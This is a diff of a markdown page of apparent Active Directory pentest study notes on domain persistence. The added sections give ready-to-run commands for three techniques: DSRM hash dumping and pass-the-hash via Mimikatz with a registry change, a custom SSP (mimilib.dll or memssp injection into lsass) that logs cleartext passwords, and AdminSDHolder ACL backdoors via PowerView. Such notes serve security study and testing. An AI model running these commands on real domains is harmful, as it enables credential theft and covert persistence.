@@ -1,6 +1,6 @@
 # AD - Domain Dominance / Persistence
 
-## asics
+## Basics
 
 * Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
 * Abusing trusts within domain, across domains and forests
@@ -65,7 +65,7 @@ Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:h
 
 <figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 Use DCsync Attack / more silent in DC Logs
 
@@ -154,11 +154,109 @@ Noisy in logs - Service Installation for a kernel mode driver will be displayed
 
 
 
+## 🔤Directory Service Restore Mode (DSRM) Attack
+
+### Description
+
+* Directory Service Restore Mode is used, when the DC is booted into "safe mode"&#x20;
+* The local Administrator on every DC is called "Administrator" whose password is the DSRM PW - it is not the RID 500 User
+* DSRM Password (SafeModePassword) is required when a server is promoted to Domain Controller and is rarely changed
+* After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC
+* Persistence: Very long! DSRM Password is set when DC is promoted, so very long.
+
+### Requirements
+
+* DA privileges are required
+* Default: The local Administrator (DSRM Administrator) is default wise not allowed to log on over the network
+
+### Tools
+
+**Dump DSRM password - needs DA privs**\
+Invoke-Mimikatz - Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local\
+\=> Here we take it from SAM hive (only local users), this is the DSRM local Administrator Password
+
+Compare the Administrator hash with the Administrator hash of the below command\
+Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local\
+\=> Here we that it from the lsass process => This is the Administrator account of the Domain
+
+**Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**\
+Enter-PSsession -computername dchostname.dc.local\
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" - name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD\
+\-or if it already exist -\
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\" - name "DsrmAdminLogonBehavior" -Value 2\
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\\"
+
+**Later we can us the following command to get DA back**\
+****Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe\
+ls \\\dc\c$
+
+## 🐶Custom Security Support Provider (SSP)
+
+### Description
+
+* SSP is a DLL which provides ways fot an application to obtain an authenticated connection. Examples from SSP provided by Microsoft: NTLM, Kerberost, Wdigest, CredSSP
+* Mimikatz provides custom SSP - mimilib.dll - This logs local logons, service account and machine account passwords in clear text on the targer server
 
 
 
+### Requirement
+
+* DA requires
+
+### Tools
+
+**Way1: Drop the mimilib.dll to C:\Windows\System32 an add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages**\
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' | select -expandproperty 'security packages'\
+$packages += "mimilib"\
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' -value $packages\
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -name 'Security Packages' -value $packages\
+Reboot the server\
+All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+
+**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/sometimes it works) / injects into lsass** \
+Invoke-Mimikatz -command '"misc::memssp"'\
+No reboot required\
+All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+
+**mimilib.dll can be edited that the output is written in any directory e.g. SYSVOL or similar**
+
+## 🔑Persistence using ACLs - AdminSDHolder
+
+### Description
+
+* AdminSDHolder is a special container on the DC (MMC AD users\&computers/System/AdminSDHolder / Properties)
+* Resides in the System container of a domain and used to control the permissions, using an ACL, for certain built-in privileged groups (called Protected Groups)
+* ❓ AdminSDHolder its own ACL is used for Protected Groups
+* Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of Protected Groups/AdminSDholder and overwrites all members of Protected Group ACLs with the ACLs of the AdminSDholder
+* Protected groups: Domain Admins, Administrators, Enterpse Admins, Domain Controllers, Read-only Domain Controllers, Schema AdminsAccount Operators, Backup Operators, Server Operators, Print Operators, Replicator\
+  ❓ Protected User group as well
+*   Well known abuse of proteced groups - see following permissions\
+
+
+    <figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+### Requirements
+
+* DA permissions required
+
+### Tools
+
+**Attack**\
+****Modify the Permissions of AdminSDholder and add your Account as member via GUI or remotly
+
+Add FullControl permissions for a user to the AdminSDHolder using PowerView as DomainAdmin:\
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName yourusername -Rigths All -verbose
+
+Using ActiveDirectory Moduel and Set-ADACL:\
+Set-ADACL -DistinguisedName 'CN=AdminSDHolder,CN=System,DC=subdom,DC=dom,DC=local' -Principal yourusername -verbose
+
+&#x20;
+
+**Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**\
+****. .\Invoke-SDPropagator\
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 
 
-
+****
 
